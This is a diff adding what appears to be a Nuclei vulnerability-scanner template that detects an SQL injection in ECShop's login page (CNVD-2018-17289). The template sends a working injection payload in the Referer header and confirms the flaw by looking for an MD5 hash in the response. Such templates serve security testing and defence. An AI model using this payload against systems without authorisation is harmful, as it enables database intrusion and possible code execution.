@@ -1,0 +1,27 @@
+id: ecshop-login-sqli
+info:
+  name: ECShop SQL Injection Vulnerability (CNVD-2018-17289)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: rce,CNVD-2018-17289
+  description: |
+    This template detects an SQL Injection vulnerability in ECShop versions, which allows remote code execution.
+
+variables:
+  r1: "{{rand_int(10000, 99999)}}"
+
+http:
+  - method: GET
+    path:
+      - "/user.php?act=login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      Referer: "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:71:\"0,1 procedure analyse(updatexml(1,insert(md5({{r1}}),1,1,0x7e),1),1)-- -\";s:2:\"id\";i:1;}"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{md5(r1)}}"
+        condition: and
